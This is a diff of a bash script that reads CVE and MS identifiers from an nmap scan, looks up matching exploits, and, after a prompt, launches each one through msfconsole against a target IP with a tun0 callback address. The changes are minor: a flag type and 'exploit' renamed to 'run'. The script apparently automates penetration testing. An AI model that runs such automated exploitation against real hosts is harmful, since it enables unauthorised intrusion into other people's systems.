@@ -4,6 +4,8 @@
 sudo apt update
 sudo apt install -y $(cat dependencies.txt)
 
+exploitsFound=0
+
 # Check for missing public keys and retrieve them
 missing_key=$(sudo apt-key list | grep -B 1 -A 1 "NO_PUBKEY" | sed -n 's/.*NO_PUBKEY //p' | uniq)
 if [[ -n "$missing_key" ]]; then
@@ -126,7 +128,7 @@ total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan
 
 # Loop through each CVE and MS value found and search for exploits
 count=0
-exploitsFound=false
+
 while read -r vuln
 do
     # Update the progress bar
@@ -177,7 +179,7 @@ do
     if [ -n "$searchResults" ]
     then
         echo "$searchResults"
-        exploitsFound=true
+        exploitsFound=1
     fi
 
     # Update progress bar
@@ -204,6 +206,6 @@ if [[ $executeExploits =~ ^[yY]$ ]]; then
         exploitPath=$(echo "$line" | cut -d ":" -f 1)
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
-        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit; exit;"
+        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; run; exit;"
     done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+' nmap-scan.txt)"
 fi
